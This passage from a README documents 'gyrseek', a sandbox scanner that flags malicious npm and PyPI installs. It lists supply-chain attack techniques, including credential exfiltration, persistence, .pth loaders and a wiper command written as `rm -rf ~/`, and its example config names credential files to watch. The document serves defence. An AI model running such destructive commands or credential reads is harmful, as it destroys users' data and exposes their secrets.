| | | Any | T12: GitHub repo dead-drop exfiltration (encrypted credentials committed to attacker repo) | ❌ | Post-compromise — not install-time. |
| | | Any | T14: cross-platform process memory scraping (`/proc/mem`, Mach APIs, `ReadProcessMemory`) | ❌ | Payload runs outside the sandbox window. |
| **Post-compromise — persistence** | — | Any | T16: IDE/AI tool config hijacking (`.claude/settings.json`, `.vscode/tasks.json`, Cursor, Copilot) | ❌ | Fires on workspace/session open — post-compromise persistence. |
| | | Any | T17: systemd / LaunchAgent persistence (`update-monitor.service`, `gh-token-monitor.service`) | ❌ | OS-level persistence installed post-compromise. |
| | | Any | T19: SSH lateral movement via `~/.ssh/known_hosts` | ❌ | Post-compromise — not install-time. |
| **Post-compromise — anti-forensics** | — | Any | T18: wiper (`rm -rf ~/`) triggered on token revocation | ❌ | Retaliatory destruction fires when incident responders revoke the token — post-compromise. |
| **Trust-chain bypass** | — | npm / PyPI | T20: SLSA provenance forgery via Sigstore/OIDC (attacker mints valid BL3 attestations) | ❌ | Trust-chain bypass — not a behavioral signal. gyrseek's sandbox diffing is independent of provenance metadata. |
| **GitHub platform exploitation** | 2026-06-16 | Any | T34: Deep Specter documented Shai-Hulud/Miasma worm evasions — backdated commit timestamps (client-supplied metadata), forged commit author identities (unverified display fields), payloads exceeding GitHub's default search index limits (large obfuscated files). 516+ malicious packages live across npm/PyPI/RubyGems, 3000+ affected repos, 200+ compromised accounts. | ✅ (unaffected) | gyrseek traces install-time execve/network/artifact signals via strace in a Docker sandbox — commit metadata (timestamps, author fields) has no bearing on strace output, and the artifact scan uses `find /work` not GitHub's search index. These evasions target GitHub's platform-level detection, not gyrseek's sandbox. |

**What gyrseek catches, stated plainly**

gyrseek reliably catches supply chain attacks where the malicious behaviour fires *during* `npm install` or `pip install` — specifically the `preinstall`/`postinstall` hook variants and `.pth` file artifacts used in the Shai-Hulud, Axios, CanisterWorm, LiteLLM, Namastex/CanisterSprawl, SAP CAP, Bitwarden, TanStack/Mini-Shai-Hulud, and easy-day-js (Mastra) waves. The Telnyx and TanStack PyPI import-time waves are deferred (see gap below). The IoC classes that trigger detection are:

- **New network connection** to GitHub Releases (`github.com/oven-sh/bun/releases/...`) — the Bun download
- **Process execution** — *any* newly introduced program execution (not just bun/deno). Previously only a `bun`/`deno` allowlist was captured; now every `execve` is recorded and diffed, so a variant using `node`, `python`, `deno`, `curl`, `wget`, or any other runtime as the payload runner is equally caught.
- **Post-install file artifact** — `.pth` files with executable content, unexpected runtime binaries, or large files not present in baselines (see [Post-Install Artifact Detection](#post-install-artifact-detection)).

Either signal alone is sufficient to block the install before it completes.

**The core gap — deferred Python execution**

Several PyPI waves (including Shai-Hulud: Hades/Miasma, Shai-Hulud: Bioinformatics/MCP, TeamPCP LiteLLM, TeamPCP Telnyx, and TeamPCP TanStack/Mini-Shai-Hulud T32) use `.pth` files and import hooks specifically to survive install-time scanners. Telnyx (T26) avoided postinstall hooks entirely, placing `FetchAudio()` and `setup()` calls at module scope in `_client.py` — the payload only fires on `import telnyx`, not during `pip install`. TanStack/Mini-Shai-Hulud (T32) used the same pattern: a cleartext backdoor appended to `mistralai`'s `__init__.py` at module scope. The sequence:

1. `pip install evil-pkg` runs inside gyrseek's sandbox — the `.pth` file is written to `site-packages`. The **post-install artifact scan** catches it (detects `.pth` files with executable imports) before the container exits, and blocks the host command. Install-time process execution and network may show nothing anomalous, but the artifact diff fails closed.
2. The next time *any* Python interpreter starts on the host, `.pth` fires, downloads Bun from GitHub, and runs the stealer — but the package was already blocked at step 1.

gyrseek's sandbox window ends when `pip install` exits.

**What closes this gap now**

The **post-install file inventory** (implemented, see [dedicated section](#post-install-artifact-detection)) runs inside the Docker container after each install probe, recording every installed file via `find /work -type f` and classifying findings on the Rust side (`.pth` with executable content, binary executables, unexpected runtime binaries, files >10 MB) before the container exits. Findings are diffed across versions: a `.pth` file newly introduced in the current version (not seen in baselines) fails closed. This catches the Hades/Miasma `.pth` write-to-disk gap — the `.pth` file is written during install and detected inside the same container session.

The remaining gap for `.pth`-based attacks is T1b (deferred bun download-and-execute on next interpreter startup). Even though the `.pth` file is now caught at T1, a container escape or interpreter-startup interception would be needed to catch the execution phase. A post-install interpreter trigger step (start Python with the installed packages on `sys.path` to force `.pth` execution) remains on the roadmap for future hardening.

A distinct gap is the Telnyx import-time pattern (T26): placing malicious code at module scope in a deeply nested SDK file (`_client.py`) so it fires on `import telnyx`, not during `pip install`. Unlike `.pth` attacks, there is no artifact file to flag — the malicious base64 blobs and import-time hooks are embedded in legitimate source files and do not match any current artifact classifier pattern (they are not `.pth`, not ELF/Mach-O/PE binaries, and not >10 MB). Closing this gap requires a post-install import trigger step for every installed Python package (execute `python -c "import <pkg>"` inside the container) to force deferred execution into the sandbox window, which is also on the roadmap.

## Configuration

`gyrseek` reads a YAML policy file to allowlist known-good endpoints and tune its release gates.

### CLI Arguments

Gyrseek supports the following global CLI arguments. They must be provided *before* the package manager command (e.g., `gyrseek --config=./my.yaml npm install`).

| Argument | Description |
|---|---|
| `--version`, `-V` | Prints the current Gyrseek version and exits. |
| `--config`, `-c` | Path to the YAML policy file. Overrides the default `gyrseek.yaml` and `GYRSEEK_CONFIG` environment variable. Example: `--config=./policy.yaml`. |
| `--danger-disable-seccomp` | Disables the embedded default-allow seccomp profile during the sandbox phase. This drastically reduces the sandbox's security guarantees and should only be used for debugging. |


**Config path:** defaults to `gyrseek.yaml` in the working directory. Override it with `--config` / `-c` or the `GYRSEEK_CONFIG` environment variable:

```bash
./target/release/gyrseek --config ./security-policy.yaml npm install
./target/release/gyrseek -c ./security-policy.yaml npm install
GYRSEEK_CONFIG=./security-policy.yaml ./target/release/gyrseek npm install
```

### Config keys

| Key                           | Default       | Purpose                                                                                                                                                                                                                                                        |
| ----------------------------- | ------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ip_allowlist`                | empty         | IPs to ignore before anomaly blocking. Canonicalized (equivalent IPv6 forms match); invalid entries are skipped with a warning.                                                                                                                                |
| `domain_allowlist`            | empty         | Domains to ignore. Lowercased, trailing `.` stripped. Subdomains match parents (`cdn.example.com` matches `example.com`). Only **forward-confirmed** PTR hostnames (FCrDNS) are matched, so a spoofed reverse-DNS record cannot bypass the allowlist.          |
| `artifact_allowlist`          | empty         | Artifact findings to allow **per package** (map of package name to list of allowed artifacts; exact `type\|path\|details` or prefix `type\|path`). New artifacts not in baselines and not allowlisted fail closed. Example: `binary\|/work/bin/tool`.               |
| `git_clone_allowlist`         | empty         | Git clone targets to allow **per package** when new install-time clone behavior appears (case-insensitive exact URL match).                                                                                                                                                    |
| `sensitive_file_access_allowlist` | empty         | Sensitive file reads to ignore **per package** (map of package name to list of allowed paths). Supports suffix matching via `*` prefix. E.g. `*.env` matches `/work/.env`. |
| `baseline_overrides`          | none          | Pin baseline versions **per package** via `baseline-1` / `baseline-2`. Missing keys fall back to registry-derived baselines.                                                                                                                                       |
| `baseline_count`              | `2`           | How many historical baselines to compare against.                                                                                                                                                                                                              |
| `min_baseline_age_hours`      | `2`           | **Per-package** minimum age (hours) before a version is eligible as a baseline. Packages not listed use the default.                                                                                                                                               |
| `new_package_exemptions`      | none          | Exempt specific new packages when fewer than 2 eligible baselines exist. `gyrseek` warns once 2+ baselines exist so you can remove the exemption.                                                                                                              |
| `internal_package_exemptions` | none          | Skip specific packages **entirely** — no registry history fetch, no sandbox install, no diff. For first-party / internal packages served from a private index (e.g. Nexus) that `gyrseek`'s public-registry lookups can't resolve, so scanning only yields noise. The package is forwarded unscanned at its requested version.            |
| `minimum_release_age_package` | off           | Minimum release age in **days**. When set, runs before burst/anomaly checks and fails closed if the current release is younger.                                                                                                                                |
| `release_burst_threshold`     | off           | Fails closed if a package published at least this many versions within the burst window.                                                                                                                                                                       |
| `release_burst_window_hours`  | `24`          | Lookback window (hours) for the burst checker.                                                                                                                                                                                                                 |
| `process_exec_allowlist`      | empty         | Process-execution signatures (`bun\|run\|build`) or bare executables (`bun`) that are allowed **per package** even when newly introduced. All executables are monitored by default; only signatures in this list escape the fail-closed diff. Sandbox harness commands are always excluded. |

### Example config

```yaml
ip_allowlist:
  - 151.101.0.223
  - 151.101.64.223
domain_allowlist:
  - pypi.org
  - files.pythonhosted.org
git_clone_allowlist:
  evil-pkg:
    - https://github.com/acme/repo.git

process_exec_allowlist:
  buildy:
    - bun|run|build
    - deno

artifact_allowlist:
  aws-sdk:
    - binary|/work/bin/aws-helper
    - suspicious_pth|/work/site-packages/aws.pth

sensitive_file_access_allowlist:
  my-database-tool:
    - "*.env"
  my-aws-tool:
    - "*.aws/credentials"
baseline_overrides:
  requests:
    baseline-1: "2.30.0"
    baseline-2: "2.29.0"
  lodash:
    baseline-1: "4.17.20"
baseline_count: 2
min_baseline_age_hours:
  requests: 6
  lodash: 12
new_package_exemptions:
  - newly-published-package
internal_package_exemptions:
  - internal-pkg-logger          # first-party package served from a private Nexus index
minimum_release_age_package: 3
release_burst_threshold: 3
release_burst_window_hours: 24
process_exec_allowlist:
  - bun|run|testing.js
  - bun|run|build
  - deno
sensitive_file_access_allowlist:
  my-database-tool:
    - "*.env"
  my-aws-tool:
    - "*.aws/credentials"
```

### Config loading behavior

- If `gyrseek.yaml` is **missing**, `gyrseek` runs with an empty allowlist.
- If a **custom** config path is provided and can't be read, `gyrseek` **fails closed**.

## Sandbox Modes

`gyrseek` runs scan probes through a `SandboxRunner` backend selected by environment variable:

| Mode                 | `GYRSEEK_SANDBOX` | Notes                                                                |
| -------------------- | ----------------- | -------------------------------------------------------------------- |
| **Docker** (default) | `docker`          | Safer default. Requires Docker CLI.                                  |
| **MicroVM**          | `microvm`         | Strongest isolation; needs a MicroVM-capable Docker runtime (Linux). |
| **Host**             | `host`            | Fastest, **reduced safety** — see warning below.                     |

```bash
GYRSEEK_SANDBOX=docker ./target/release/gyrseek npm install
GYRSEEK_SANDBOX=host  ./target/release/gyrseek pip3 install -r requirements.txt
```

- If sandbox initialization fails, `gyrseek` exits non-zero (fail-closed).
- ⚠️ **Host mode does not provide meaningful isolation.** If the package is malicious, you are effectively running it directly on your machine and only getting a warning from `gyrseek`. Use it only for local development or environments without Docker.

### MicroVM configuration

- `GYRSEEK_MICROVM_RUNTIME` selects the Docker runtime (default: `kata-runtime`).
- If the runtime isn't present in `docker info`, startup fails closed with an explicit message.
- List available runtimes: `./target/release/gyrseek sandbox runtimes`
- Requires a Linux environment with the runtime installed and exposed through Docker. On macOS Docker Desktop, Kata-style runtimes are typically unavailable — use a Linux VM or host.

### Platform support matrix

| Mode      | macOS (Docker Desktop)                                   | Linux host/VM                                                |
| --------- | -------------------------------------------------------- | ------------------------------------------------------------ |
| `docker`  | Supported                                                | Supported                                                    |
| `host`    | Supported (requires local `strace`)                      | Supported (requires local `strace`)                          |
| `microvm` | Usually unavailable (Kata/runtime typically not exposed) | Supported when a MicroVM-capable Docker runtime is installed |

### Scanner image configuration

| Variable                                                       | Default                 | Purpose                                      |
| -------------------------------------------------------------- | ----------------------- | -------------------------------------------- |
| `GYRSEEK_NPM_SCANNER_IMAGE`                                    | `node:26.3-bookworm-slim@sha256:3fe8...` | npm/pnpm scanner image.                      |
| `GYRSEEK_PY_SCANNER_IMAGE`                                     | `python:3.13-slim-bookworm@sha256:05b9...` | Python scanner image (pip/uv/poetry).     |
| `GYRSEEK_PREBUILT_SCANNER_IMAGES`                              | `false`                 | Enable prebuilt fast path for both managers. |
| `GYRSEEK_NPM_SCANNER_PREBUILT` / `GYRSEEK_PY_SCANNER_PREBUILT` | `false`                 | Per-manager prebuilt override.               |

| `GYRSEEK_DOCKER_APPARMOR_PROFILE`                               | `false`                 | Boolean toggle (`true`/`false`) for embedded AppArmor profile use in Docker/microvm sandbox runs. Loaded via `apparmor_parser` at runtime. On macOS (where `apparmor_parser` is unavailable), a warning is emitted and the sandbox falls back to Docker's default AppArmor profile. Requires `apparmor-utils` + prebuilt scanner image on native Linux hosts (runtime apt setup conflicts with profile). Defaults to `false` because the prerequisites are not always met. Recommended to enable on Linux hosts with prebuilt images for stronger path-based protection. |

In prebuilt mode, runtime setup (`apt-get`, Python `uv` bootstrapping, `corepack enable pnpm`) is skipped to reduce hot-path latency.

## Prebuilt Scanner Images

For faster probe startup and fewer runtime setup failures, prebuild scanner images with the required tools already installed. Prebuilt Dockerfiles ship with the repo at `docker/Dockerfile.npm` and `docker/Dockerfile.python`.

### 1) Build the scanner images

```bash
# npm/pnpm scanner
just docker-build-npm

# Python scanner (pip/uv/poetry)
just docker-build-python
```

Or build directly:

```bash
docker build -f docker/Dockerfile.npm -t gyrseek-npm-scanner:latest .
docker build -f docker/Dockerfile.python -t gyrseek-python-scanner:latest .
```

### 2) Use a prebuilt image

```bash
GYRSEEK_NPM_SCANNER_IMAGE=gyrseek-npm-scanner:latest \
GYRSEEK_NPM_SCANNER_PREBUILT=true \
./target/release/gyrseek npm update

GYRSEEK_PY_SCANNER_IMAGE=gyrseek-python-scanner:latest \
GYRSEEK_PY_SCANNER_PREBUILT=true \
./target/release/gyrseek uv sync
```

### 3) Enable prebuilt mode globally (optional)

```bash
GYRSEEK_PREBUILT_SCANNER_IMAGES=true \
GYRSEEK_NPM_SCANNER_IMAGE=gyrseek-npm-scanner:latest \
GYRSEEK_PY_SCANNER_IMAGE=gyrseek-python-scanner:latest \
./target/release/gyrseek npm update
```

### 4) Verify images are usable

```bash
docker run --rm gyrseek-npm-scanner:latest sh -lc 'strace -V'
docker run --rm gyrseek-python-scanner:latest sh -lc 'strace -V && uv --version'
```

If these pass, `GYRSEEK_*_SCANNER_PREBUILT=true` should work without runtime tool installation.

### 5) Use pinned image digests (recommended for reproducibility)

To avoid tag drift, pin scanner images by digest (replace with real digests from your registry):

```bash
GYRSEEK_NPM_SCANNER_IMAGE=gyrseek/npm-scanner@sha256:REPLACE_WITH_REAL_DIGEST \
GYRSEEK_PY_SCANNER_IMAGE=gyrseek/py-scanner@sha256:REPLACE_WITH_REAL_DIGEST \
GYRSEEK_PREBUILT_SCANNER_IMAGES=true \
./target/release/gyrseek npm update
```

> **Tip:** Build and push scanner images once in CI, resolve immutable digests, and reference only digest-pinned images in production or shared CI.

## Behavior Reference

Details worth knowing once you're past the basics.

**Execution & caching**

- `gyrseek` forwards your command in the current working directory.
- Repeated package-version probes within the same CLI execution are cached in-memory and reused.
- Docker mode batches probe matrices (multiple packages × versions) into a single container run when possible.

**Version handling**

- Version selection is semantic-version aware: npm uses semver, Python (pip/uv/poetry) uses PEP 440. Unparseable version strings sort below any parseable version, so malformed entries are never chosen as `latest`.
- After a clean scan of an unpinned (`latest`) **explicit install target**, the forwarded command is rewritten to pin the exact version that was examined, so the host installs the same version `gyrseek` scanned. Lockfile-driven flows (`uv sync`, `poetry install`, etc.) already carry pinned versions and are forwarded verbatim.
- If baseline versions are unavailable, output may show `baseline-1=n/a` and `baseline-2=n/a`.

**Per-command scanning scope**

- `uv sync` scans all packages found in `uv.lock` before forwarding.
- `uv sync`, `uv lock` (bare), and `uv lock --upgrade` exclude local project entries (editable/path/workspace blocks) from comparison.
- `uv pip sync` scans all parseable packages from its source files (requirements-style files and `pylock.toml`).
- `uv lock` (bare) and `uv lock --upgrade` scan all packages in `uv.lock`; both fail closed if `uv.lock` is missing or empty. `uv lock -P/--upgrade-package` scans the explicitly targeted packages. When `-P` is followed by a flag (e.g. `-P --dry-run`), the flag is not consumed as a package name and the next real `-P pkg` argument is not silently skipped.
- `pip install` / `pip3 install` scan all parseable entries, including `-r/--requirements` files.
- `poetry install`, `poetry update`, and `poetry lock` scan all packages in `poetry.lock`, excluding local directory/path/editable source blocks. `poetry lock` fails closed if `poetry.lock` is missing or empty.
- `npm install`, `npm i`, `npm update`, `pnpm add`, `pnpm install`, `pnpm i`, and `pnpm update` scan explicit targets; with no targets they scan `package.json` dependencies. Both paths exclude non-registry specs (`file:`, `workspace:`, `git+`, URL, `link:`) — previously `link:` was filtered in the `package.json` fallback but passed through as a package name on the CLI arg path.
- `uv venv` and other unrecognized `uv` subcommands are forwarded verbatim (unscanned passthrough).

**Fail-closed guarantees**

- **Unrecognized manager:** any first argument other than `pip`, `pip3`, `uv`, `poetry`, `npm`, or `pnpm` is rejected with a non-zero exit and a clear error message listing the supported managers. The only exception is `sandbox runtimes` (a built-in diagnostic). Previously, unrecognized managers were silently forwarded unscanned.
- For supported install/sync paths, package-detection failures are fail-closed (non-zero exit) instead of passthrough.
- If the host command itself cannot be launched after a clean scan, `gyrseek` also fails closed.
- A sandbox probe that produces an **empty/whitespace trace** (e.g. `strace` could not attach) is a hard error: every package in that batch is blocked. Blank traces are never interpreted as clean.
- **Post-install artifact findings** — binary executables, suspicious `.pth` files, unexpected runtimes, and large files — are diffed across versions. A finding newly present in the current version (absent from all baselines) fails closed (see [Post-Install Artifact Detection](#post-install-artifact-detection)).
- When a forwarded command exits non-zero, `gyrseek` **exits with the same code** rather than masking the failure as success.

## Docker Security

See [`docs/DOCKER_SECURITY.md`](docs/DOCKER_SECURITY.md) for the canonical reference on Docker sandbox hardening, including:

- **Seccomp profile** — embedded in `src/sandbox.rs`, enabled by default, materialized to a temp file at runtime. Denies high-risk syscalls while preserving network access for package managers.
- **AppArmor profile** — embedded in `src/sandbox.rs`, disabled by default (`GYRSEEK_DOCKER_APPARMOR_PROFILE`, default `false`); enable explicitly with `GYRSEEK_DOCKER_APPARMOR_PROFILE=true`. Loaded via `apparmor_parser` at runtime. Requires `apparmor-utils` + prebuilt scanner image on Linux. Falls back with a warning on macOS. Recommended for stronger path-based protection.
- **Capabilities** — `SYS_PTRACE` added for cross-UID strace; `no-new-privileges` enabled.
- **Unprivileged payload** — traced install runs as unprivileged user; trace logs are root-owned.
- **Validation checklist**, troubleshooting, backout plan, and current hardening limitations.

## Testing

Tests follow Rust convention: everything that doesn't need to spawn the compiled binary lives inline in its `src/` module under `#[cfg(test)]`, giving tests direct access to private items. Only CLI-level exit-code tests that must spawn the real binary remain in `tests/`.

**Unit and integration tests** (no Docker required):

```bash
# Run everything
just test
just lint

# Or directly:
cargo test

# Run tests from a specific source module
cargo test --lib scanning
cargo test --lib parsing
cargo test --lib

# Run the CLI exit-code integration tests (spawn the binary)
cargo test --test cli_burst_exit_tests
cargo test --test forward_fail_closed_tests
cargo test --test lock_routing_tests
cargo test --test pnpm_routing_tests
cargo test --test version_flag_tests

# Run one specific test case by name
cargo test parses_npm_install_with_pinned_version
cargo test detects_anomalous_new_connection
cargo test flags_newly_introduced_bun_execution

# Show println! output while testing
cargo test -- --nocapture
```

**End-to-end tests** (requires Docker and the release binary):

```bash
just test-npm
just test-pnpm
just test-pip
just test-uv
just test-poetry
```

Behavior test coverage includes deterministic DNS-enrichment checks, FCrDNS forward-confirmation, bracketed-argv preservation, process-execution detection, git-clone signature diffing, and release-burst policy enforcement.

## Project Layout & Docs

**Source & tests**

Tests follow Rust convention — inline in their module under `#[cfg(test)]`, only CLI-level exit-code tests remain in `tests/`.

- `src/main.rs` — binary entrypoint
- `src/lib.rs` — command routing, orchestration, config loading; inline tests for `GyrSeek::parse_package_details`
- `src/parsing.rs` — command, lockfile, and requirements parsing; inline tests for all parsers and `rewrite_args_with_pinned_versions`
- `src/scanning.rs` — registry lookup and behavior scanning engine; inline tests for version ordering, trace extraction, network/git-clone/process-execution detection, FCrDNS, and full scan pipeline
- `src/sandbox.rs` — sandbox backends and mode selection; inline tests for docker args, strace flags, and unprivileged-payload integrity
- `tests/cli_burst_exit_tests.rs` — release burst and minimum release age CLI exit-code tests (spawn binary)
- `tests/forward_fail_closed_tests.rs` — fail-closed forwarding and exit-status propagation tests (spawn binary)
- `tests/lock_routing_tests.rs` — `poetry lock`, `uv lock`, `pnpm install` routing and `uv venv` passthrough tests (spawn binary)
- `tests/pnpm_routing_tests.rs` — `pnpm add` / `pnpm install` package.json fallback routing tests (spawn binary)
- `tests/version_flag_tests.rs` — `--version`/`-V` print-and-exit and forwarded trailing `--version` passthrough tests (spawn binary)

**Just recipes**

- `just build` — release build
- `just install` / `just uninstall` — install or remove the Cargo bin

- `just tag` — tag `HEAD` with the `Cargo.toml` version and push to `origin`
- `just fmt` — format Rust code
- `just test` — run Rust tests
- `just lint` — run cargo check, clippy, and format checks
- `just test-{npm,pnpm,pip,uv,poetry}` — end-to-end tests per manager

**Collaboration docs** (for multi-developer / multi-LLM work)

- `docs/ARCHITECTURE.md` — control-flow and component map
- `docs/DEV_GUIDE.md` — contributor workflow and change hygiene
- `docs/ROADMAP.md` — planned improvements and next steps
- `docs/OPEN_FINDINGS.md`, `docs/FIXED_FINDINGS.md`, `docs/WONT_FIX_FINDINGS.md` — security and correctness findings logs
- `docs/DOCKER_SECURITY.md` — Docker sandbox security reference (seccomp, AppArmor, capabilities, validation)
- `AGENTS.md` — repository memory and mandatory update policy

> **Repository policy:** after each change, update both `AGENTS.md` and `README.md`.

## License

See [LICENSE](LICENSE).
